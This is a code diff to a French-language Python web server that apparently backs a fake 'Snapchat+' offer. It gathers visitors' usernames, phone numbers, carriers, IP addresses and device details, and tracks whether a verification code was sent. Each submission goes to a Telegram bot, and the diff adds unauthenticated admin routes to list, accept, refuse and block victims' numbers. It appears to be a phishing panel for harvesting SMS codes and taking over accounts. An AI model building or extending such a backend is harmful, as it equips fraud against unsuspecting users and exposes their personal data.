@@ -1,6 +1,7 @@
 import json, os, time, threading, urllib.request
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from urllib.parse import urlparse
+from datetime import datetime, timezone
 
 PORT = int(os.environ.get("PORT", 3000))
 SITE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -14,6 +15,7 @@ TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 requests_db = {}
 history_log = []
 blocked_phones = set()
+blocked_users = set()
 
 
 def norm_phone(p):
@@ -21,13 +23,14 @@ def norm_phone(p):
 
 
 def load_data():
-    global requests_db, history_log, blocked_phones
+    global requests_db, history_log, blocked_phones, blocked_users
     try:
         with open(DATA_FILE, "r", encoding="utf-8") as f:
             d = json.load(f)
         requests_db = {k: v for k, v in d.get("requests", {}).items()}
         history_log = list(d.get("history", []))
         blocked_phones = set(d.get("blocked_phones", []))
+        blocked_users = set(d.get("blocked_users", []))
         print("[server] donnees chargees (%d demandes, %d bloques)" % (len(requests_db), len(blocked_phones)))
     except Exception:
         pass
@@ -40,6 +43,7 @@ def persist():
                 "requests": requests_db,
                 "history": history_log[-200:],
                 "blocked_phones": sorted(blocked_phones),
+                "blocked_users": sorted(blocked_users),
             }, f, ensure_ascii=False)
     except Exception as e:
         print("[server] echec sauvegarde: %s" % e)
@@ -82,17 +86,19 @@ def tg_notify_request(data, rid):
     if not TELEGRAM_BOT_TOKEN:
         return
     text = (
-        "📲 <b>Nouvelle demande</b>\n"
+        "📲 <b>Nouvelle demande Snap+</b>\n"
         "─────────────\n"
         "Service : <b>Snapchat+</b>\n"
         "Pseudo : %s\n"
         "Compte : %s\n"
         "Numero : <code>%s</code>\n"
+        "Operateur : %s\n"
         "ID : <code>%s</code>"
     ) % (
         str(data.get("pseudo") or "-"),
         str(data.get("handle") or "-"),
         format_phone(data.get("phone")) or "-",
+        str(data.get("operator") or "-"),
         rid[:8].upper(),
     )
     tg_send(text)
@@ -123,6 +129,7 @@ class Server(SimpleHTTPRequestHandler):
 
     def do_GET(self):
         p = urlparse(self.path).path
+
         if p == "/":
             self.path = "/choose.html"
             return super().do_GET()
@@ -138,6 +145,16 @@ class Server(SimpleHTTPRequestHandler):
                 return self._json({"ok": True, "status": "code_sent", "at": r["code_sent_at"]})
             return self._json({"ok": True, "status": "pending"})
 
+        if p == "/api/admin/list":
+            items = [{"id": rid, "data": r["data"], "code_sent": r.get("code_sent", False), "code_sent_at": r.get("code_sent_at")} for rid, r in requests_db.items() if r["state"] == "pending"]
+            return self._json({"ok": True, "items": items})
+
+        if p == "/api/admin/history":
+            return self._json({"ok": True, "items": history_log[-50:][::-1]})
+
+        if p == "/api/admin/blocked":
+            return self._json({"ok": True, "items": sorted(blocked_phones)})
+
         super().do_GET()
 
     def do_POST(self):
@@ -150,25 +167,27 @@ class Server(SimpleHTTPRequestHandler):
 
         if p == "/api/request":
             rid = d.get("rid", "")
-            phone = norm_phone(d.get("phone"))
+            data = {k: d.get(k) for k in ["service", "pseudo", "handle", "phone", "operator", "opType", "ip", "device", "browser", "os"]}
+            phone = norm_phone(data.get("phone"))
             if phone and phone in blocked_phones:
                 requests_db[rid] = {
-                    "data": d, "state": "done", "by": "block",
+                    "data": data, "state": "done", "by": "block",
                     "code_sent": False, "code_sent_at": None,
                     "ts": d.get("ts", int(time.time() * 1000)),
                 }
                 history_log.append({"action": "block", "data": d, "ts": int(time.time() * 1000)})
                 persist()
+                tg_notify_request(data, rid)
                 return self._json({"ok": True})
 
             requests_db[rid] = {
-                "data": d, "state": "pending",
+                "data": data, "state": "pending",
                 "code_sent": False, "code_sent_at": None,
                 "ts": d.get("ts", int(time.time() * 1000)),
             }
-            print("[server] Nouvelle demande: %s (%s)" % (d.get("pseudo"), phone))
+            print("[server] Nouvelle demande: %s (%s)" % (data.get("pseudo"), phone))
             persist()
-            tg_notify_request(d, rid)
+            tg_notify_request(data, rid)
             return self._json({"ok": True})
 
         if p == "/api/code":
@@ -178,6 +197,46 @@ class Server(SimpleHTTPRequestHandler):
             if not r:
                 return self._json({"ok": False}, 404)
             persist()
+            return self._json({"ok": True})
+
+        if p.startswith("/api/admin/accept/"):
+            rid = p.split("/")[-1]
+            r = requests_db.get(rid)
+            if not r:
+                return self._json({"ok": False, "error": "not_found"})
+            r["state"] = "done"
+            r["by"] = "accept"
+            history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
+            persist()
+            return self._json({"ok": True})
+
+        if p.startswith("/api/admin/refuse/"):
+            rid = p.split("/")[-1]
+            r = requests_db.get(rid)
+            if not r:
+                return self._json({"ok": False, "error": "not_found"})
+            r["state"] = "done"
+            r["by"] = "refuse"
+            history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
+            persist()
+            return self._json({"ok": True})
+
+        if p == "/api/admin/block":
+            phone = norm_phone(d.get("phone", ""))
+            if not phone:
+                return self._json({"ok": False, "error": "missing_phone"})
+            blocked_phones.add(phone)
+            history_log.append({"action": "block", "data": {"phone": phone}, "ts": int(time.time() * 1000)})
+            persist()
+            return self._json({"ok": True, "blocked": sorted(blocked_phones)})
+
+        if p == "/api/admin/unblock":
+            phone = norm_phone(d.get("phone", ""))
+            blocked_phones.discard(phone)
+            persist()
+            return self._json({"ok": True, "blocked": sorted(blocked_phones)})
+
+        if p in ("/api/visit", "/api/log"):
             return self._json({"ok": True})
 
         self.send_error(404)
